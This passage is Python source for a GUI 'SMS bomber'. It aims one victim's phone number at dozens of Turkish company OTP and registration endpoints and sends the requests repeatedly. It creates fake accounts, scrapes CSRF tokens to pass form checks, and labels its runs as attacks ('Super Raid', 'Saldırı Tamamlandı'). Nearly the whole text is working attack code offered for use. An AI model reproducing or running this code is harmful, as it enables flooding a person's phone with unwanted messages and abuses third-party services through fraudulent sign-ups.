         response = requests.post('https://core.kahvedunyasi.com/api/users/sms/send', json = {"mobile_number": phone.get(),"token_type":"register_token"})
        except:
         print("Unc")
        try:
         response = requests.post('https://www.joker.com.tr/kullanici/ajax/check-sms', json = {"phone":"0"+phone.get()})
         print("[+]|Joker")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.migros.com.tr/rest/users/login/otp', json = {"phoneNumber":phone.get()})
         print("[+]|Migros")
        except:
         print("Unc")
        try:
         response = requests.post('https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/users/anonymous/validate?lang=tr&curr=TRY', json = {"email":"emai4l@gmail.com","emailAllow":"true","firstName":"Muhammer","kvkkAllow":"true","lastName":"Dere","password":"@!Derebey1234567","registerChannel":"","smsAllow":"true","uid":phone.get(),"userAgreement":"true"})
         print("[+]|Ebebek")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.wmf.com.tr/users/register/', json = {"confirm":"true","date_of_birth":"2007-06-02","email":"email@gmail.com","email_allowed":"true","first_name":"Muhammer","gender":"male","last_name":"Dere","password":"Derebey123456","phone":"0"+phone.get(),"sms_allowed":"true"})
         print("[+]|WmfApi")
        except:
         print("Unc")
        try:
         response = requests.post('https://shop.naosstars.com/users/register/', json = {"email": "email@gmail.com","first_name": "Muhammer","last_name": "Dere","password": "Derebey123456","date_of_birth": "1952-02-08","phone": "0"+phone.get(),"gender": "male","kvkk": "true","contact": "true","confirm": "true"})
         print("[+]|Naos")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.opet.com.tr/api/authentication/register', json = {"birthdate":"1999-02-12T22:00:00.000Z","commencisRadio":"true","email":"email@gmail.com","firstName":"Muhammer","googleRadio":"true","lastName":"Dere","microsoftRadio":"true","mobilePhone": phone.get(),"opetKvkkAndEtk":"true","plate":"34K8773"})
         print("[+]|Opet")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.network.com.tr/otp/CreateOtp', data = {"PhoneNumber":phone.get(), "OtpType":"4"})
         print("[+]|Network")
        except:
         print("Unc")
        try:
         response = requests.post('https://frontend.dominos.com.tr/api/customer/sendOtpCode', json = {"mobilePhone":phone.get(), "email":"email@gmail.com"})
         print("[+]|Dominos")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.dsmartgo.com.tr/web/account/checkphonenumber', data = {"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41","IsSubscriber": "true","__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U","Mobile": phone.get(),
                                                                                                   
         }, cookies={

        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		"_ga": "GA1.3.1016548678.1638216163",

        		"_gat": "1",

        		"_gat_gtag_UA_18913632_14": "1",

        		"_gid": "GA1.3.1214889554.1638216163",

        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
         })
         print("[+]|Dsmart")
#DSMART SON <-!---------!->
        except:
         print("Unc")
        try:
         response = requests.post('https://www.a101.com.tr/users/otp-login/', data = {"phone":"0"+phone.get()})
         print("[+]|A101")
        except:
         print("Unc")
        try:
         response=requests.post('https://www.kigili.com/users/registration/', data = {"first_name": "Memati","last_name": "Bas","email": "email@gmail.com","phone": f"0{phone.get()}","password": "31ABC..abc31","confirm": "true","kvkk": "true","next": ""})
         print("[+]|Kiğili")
        except:
         print("Unc")
        try:
         response=requests.post('https://bim.veesk.net:443/service/v1.0/account/login', json = {"phone": phone.get()})
         print("[+]|Bim")
        except:
          print("Unc")
        try:
         response=requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":"+90"+phone.get(), "headers":"{}"})
         print("[+]|Gotİnd")
        except:
         print("Unc")
    #CEPTEŞOK
        try:
         response=requests.post('https://api.ceptesok.com:443/api/users/sendsms', json={"mobile_number": phone.get(), "token_type": "register_token"})
         print("[+]|Şok")
        except:
         print("Unc")
    #ENGLİSHHOME
        try:
         response=requests.post('https://www.englishhome.com:443/enh_app/users/registration/', data={"first_name": "Memati", "last_name": "Bas", "email": "email1@gmail.com", "phone": "0"+phone.get(), "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"})
         print("[+]|EnglishHome")
        except:
         print("Unc")
        try:
         response=requests.post('https://api.kunduz.com/auth/login/otp/', json = {"phone_number":{"country_code":1,"number":phone.get()}})
         print("[+]|Kunduz")
        except:
         print("Unc")
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone.get()}&pwd=&checkPwd=")
            print("[+]|Mopaş")
        except:
            print("Unc")
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": phone.get()}
            r = requests.post(url, headers=headers, json=json)
            print("[+]|Watsons")
        except:
            print("Unc")
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone.get()}"})
            print("[+]|KimGB")
        except:
            print("Unc")
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": "email1@gmail.com", "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": phone.get()}
            r = requests.post(url, json=json)
            print("[+]|Ikı Yeni")
        except:
            print("Unc")
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": "email1@gmail.com", "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(phone.get()), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            print("[+]|TerraPizza")
        except:
            print("Unc")
        try:
            url = "https://42577.smartomato.ru/account/session"
            data={
              "g-recaptcha-response":"null",
              "phone":"90"+phone.get()}
            r = requests.post(url,  data=data)
            print("[+]|AutoSmart")
        except:
            print("Unc")

        verial=phone.get() + " [+]|BAŞARILI"
        yaziyaz=customtkinter.CTkLabel(kaydir, text=verial)
        yaziyaz.pack()
        print("[+]|Saldırı Tamamlandı")
def tekrarlıspammer():  
    for i in range(int(phonec.get())):
        try:    
            kahve_dunyasi = requests.post("https://ipapp.ipragaz.com.tr/login/register", json={

                "name": "doğukan yıldırım",
                "phone": phone.get(),
                "day": "15",
                "month": "3",
                "year": "2004",
                "carPlate": "12     asd     23454",
                "CSRFToken": "5f6973e0-8452-4506-bdfc-c85ba96100a4",
                "savePersonalData": "true"

            })
            print("[+]|KahveDünyası")
        except:    
            print("Unc") 
        try:    
            vakko = requests.post("https://www.vakko.com/users/register/", json={

                
  "email": "email1@gmail.com",
  "first_name": "DOĞUKAN",
  "last_name": "YILDIRIM",
  "date_of_birth": "2004-02-05",
  "password": "@Muratbey12345",
  "phone": "0"+phone.get(),
  "sms_allowed": "true",
  "email_allowed": "true",
  "gender": "male",
  "confirm": "true",
  "kvkk_confirm": "true",
  "call_allowed": "true"


            })
            print("[+]|VakkoPlus")
        except:    
            print("Unc") 
        try:    
            colm = requests.post("https://www.columbia.com.tr/api/customer/customerpolicy/setpermission", json={

                

  "firstName": "doğukan",
  "lastName": "yıldırım",
  "email": "email1@gmail.com",
  "phone": "0"+phone.get(),
  "smsPermission": "true",
  "emailPermission": "true",
  "SharePermission": "true",
  "KvkkPermission": "true",
  "CallPermission": "true",
  "IsConsentTextConfirmed": "true"


            })
            print("[+]|Collap")
        except:    
            print("Unc") 
        try:    
            ttkom = requests.post("https://onlineislemler.turktelekom.com.tr/oim/verification/otp/generate", json={
"msisdn": phone.get(),
"verificationOtpType": "NEW_SUBSCRIPTION_APPLICATION_MOBILE"
            })
            print("[+]|TürkTelekom")
        except:    
            print("Unc") 
        try:
          
          client=requests.session()
          login_page = client.get("https://www.derimod.com.tr/register/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.derimod.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "dob_day": "01",
          "dob_month": "02",
          "dob_year": "2006",
          "date_of_birth": "2006-02-01",
          "event_type": "register",
          "gender": "",
          "phone": "0"+phone.get(),
          "password": "Muratbaba123",
          "email_allowed": "true",
          "sms_allowed": "true",
          "confirm": "true",
          "add_loyalty": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://tr.uspoloassn.com/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://tr.uspoloassn.com/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.pierrecardin.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.pierrecardin.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Pieno")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.cacharel.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.cacharel.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"password2": "Muratbey123",
"confirm": "true",
"sms_allowed": "true",
"email_allowed": "true"
})
          print("[+]|Chilon")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.sportive.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.sportive.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"email_allowed": "true",
"sms_allowed": "true",
"contact_allowed": "true",
"confirm": "true",
"confirm-2": "true",
"next":"" 
})
          print("[+]|Sporty")
        except:
          print("Unc")
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": phone.get()
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            print("[+]|TıklaGelsin")
        except:
            print("Unc")
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                "mobile_number": phone.get(),

                "token_type": "register_token"

            })
            print("[+]|Leos")
        except:    
            print("Unc")
        try:    
            tefal = requests.post("https://www.tefal.com.tr/users/register/", json={

"email": "email1@gmail.com",
"first_name": "doğukan",
"last_name": "yıldırım",
"password": "Muratbey123",
"phone": "0"+phone.get(),
"confirm": "true",
"email_allowed": "true",
"sms_allowed": "true",
"date_of_birth": "1991-02-1"

            })
            print("[+]|Tiamot")
        except:    
            print("Unc")
        try:    
            macrocenter = requests.post("https://www.macrocenter.com.tr/rest/users/v2/register/otp?reid=1677", json={"email": "email1@gmail.com","phoneNumber": phone.get()
            })
            print("[+]|Macro")
        except:    
            print("Unc")
        try:
          ozel_api = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={
            "phone_number" : "+90"+phone.get(),
            "headers":"{}",
        })
          print("[+]|UomilApi")
        except:
            print("Unc")
        try:
         url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
         json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": "90"+phone.get(), "route": "sms"}, "reqId": "25299-1669396271"}
         response=requests.post(url, headers=headers, json=json)
         print("[+]|İcq")
        except:
          print("Unc")
        try:
         url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
         json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": phone.get(), "day": "31", "Email": "email1@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
         response = requests.post(url, headers=headers, json=json)
         print("[+]|Boyn")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send', json = {"action": "create", "email": "asdardemeyenasdarolur19@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "asdardemeyenasdarolur19@yaani.com", "type": "msisdn", "value": "90"+phone.get()}]})
         print("[+]|Yaani")
        except:
         print("Unc")
        try:
         headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
         response=requests.post('https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={num}', json = {"email":"jhrox@gmail.com","mobilePhone":phone.get(),"isSure":"false"},headers=headers)
         print("[+]|Bineq")
        except:
         print("Unc")
        try:
         response = requests.post('https://core.kahvedunyasi.com/api/users/sms/send', json = {"mobile_number": phone.get(),"token_type":"register_token"})
        except:
         print("Unc")
        try:
         response = requests.post('https://www.joker.com.tr/kullanici/ajax/check-sms', json = {"phone":"0"+phone.get()})
         print("[+]|Joker")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.migros.com.tr/rest/users/login/otp', json = {"phoneNumber":phone.get()})
         print("[+]|Migros")
        except:
         print("Unc")
        try:
         response = requests.post('https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/users/anonymous/validate?lang=tr&curr=TRY', json = {"email":"emai4l@gmail.com","emailAllow":"true","firstName":"Muhammer","kvkkAllow":"true","lastName":"Dere","password":"@!Derebey1234567","registerChannel":"","smsAllow":"true","uid":phone.get(),"userAgreement":"true"})
         print("[+]|Ebebek")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.wmf.com.tr/users/register/', json = {"confirm":"true","date_of_birth":"2007-06-02","email":"email@gmail.com","email_allowed":"true","first_name":"Muhammer","gender":"male","last_name":"Dere","password":"Derebey123456","phone":"0"+phone.get(),"sms_allowed":"true"})
         print("[+]|WmfApi")
        except:
         print("Unc")
        try:
         response = requests.post('https://shop.naosstars.com/users/register/', json = {"email": "email@gmail.com","first_name": "Muhammer","last_name": "Dere","password": "Derebey123456","date_of_birth": "1952-02-08","phone": "0"+phone.get(),"gender": "male","kvkk": "true","contact": "true","confirm": "true"})
         print("[+]|Naos")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.opet.com.tr/api/authentication/register', json = {"birthdate":"1999-02-12T22:00:00.000Z","commencisRadio":"true","email":"email@gmail.com","firstName":"Muhammer","googleRadio":"true","lastName":"Dere","microsoftRadio":"true","mobilePhone": phone.get(),"opetKvkkAndEtk":"true","plate":"34K8773"})
         print("[+]|Opet")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.network.com.tr/otp/CreateOtp', data = {"PhoneNumber":phone.get(), "OtpType":"4"})
         print("[+]|Network")
        except:
         print("Unc")
        try:
         response = requests.post('https://frontend.dominos.com.tr/api/customer/sendOtpCode', json = {"mobilePhone":phone.get(), "email":"email@gmail.com"})
         print("[+]|Dominos")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.dsmartgo.com.tr/web/account/checkphonenumber', data = {"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41","IsSubscriber": "true","__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U","Mobile": phone.get(),
                                                                                                   
         }, cookies={

        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		"_ga": "GA1.3.1016548678.1638216163",

        		"_gat": "1",

        		"_gat_gtag_UA_18913632_14": "1",

        		"_gid": "GA1.3.1214889554.1638216163",

        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
         })
         print("[+]|Dsmart")
#DSMART SON <-!---------!->
        except:
         print("Unc")
        try:
         response = requests.post('https://www.a101.com.tr/users/otp-login/', data = {"phone":"0"+phone.get()})
         print("[+]|A101")
        except:
         print("Unc")
        try:
         response=requests.post('https://www.kigili.com/users/registration/', data = {"first_name": "Memati","last_name": "Bas","email": "email@gmail.com","phone": f"0{phone.get()}","password": "31ABC..abc31","confirm": "true","kvkk": "true","next": ""})
         print("[+]|Kiğili")
        except:
         print("Unc")
        try:
         response=requests.post('https://bim.veesk.net:443/service/v1.0/account/login', json = {"phone": phone.get()})
         print("[+]|Bim")
        except:
          print("Unc")
        try:
         response=requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":"+90"+phone.get(), "headers":"{}"})
         print("[+]|Gotİnd")
        except:
         print("Unc")
    #CEPTEŞOK
        try:
         response=requests.post('https://api.ceptesok.com:443/api/users/sendsms', json={"mobile_number": phone.get(), "token_type": "register_token"})
         print("[+]|Şok")
        except:
         print("Unc")
    #ENGLİSHHOME
        try:
         response=requests.post('https://www.englishhome.com:443/enh_app/users/registration/', data={"first_name": "Memati", "last_name": "Bas", "email": "email1@gmail.com", "phone": "0"+phone.get(), "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"})
         print("[+]|EnglishHome")
        except:
         print("Unc")
        try:
         response=requests.post('https://api.kunduz.com/auth/login/otp/', json = {"phone_number":{"country_code":1,"number":phone.get()}})
         print("[+]|Kunduz")
        except:
         print("Unc")
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone.get()}&pwd=&checkPwd=")
            print("[+]|Mopaş")
        except:
            print("Unc")
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": phone.get()}
            r = requests.post(url, headers=headers, json=json)
            print("[+]|Watsons")
        except:
            print("Unc")
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone.get()}"})
            print("[+]|KimGB")
        except:
            print("Unc")
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": "email1@gmail.com", "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": phone.get()}
            r = requests.post(url, json=json)
            print("[+]|Ikı Yeni")
        except:
            print("Unc")
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": "email1@gmail.com", "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(phone.get()), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            print("[+]|TerraPizza")
        except:
            print("Unc")
        try:
            url = "https://42577.smartomato.ru/account/session"
            data={
              "g-recaptcha-response":"null",
              "phone":"90"+phone.get()}
            r = requests.post(url,  data=data)
            print("[+]|AutoSmart")
        except:
            print("Unc")

        verial= "[+]|BAŞARILI" + phone.get()
        yaziyaz=customtkinter.CTkLabel(kaydir, text=verial)
        yaziyaz.pack()
        print("[+]|Saldırı Tamamlandı")
 

# Use CTkButton instead of tkinter Button
button = customtkinter.CTkButton(master=app, text="Başlat", command=spammer)
button.place(relx=0.1, rely=0.90, anchor=tkinter.CENTER)

button2 = customtkinter.CTkButton(master=app, text="Super Raid", command=superspammer)
button2.place(relx=0.29, rely=0.90, anchor=tkinter.CENTER)

button3 = customtkinter.CTkButton(master=app, text="Tekrarlı Saldırı", command=tekrarlıspammer)
button3.place(relx=0.48, rely=0.90, anchor=tkinter.CENTER)
 
app.mainloop()
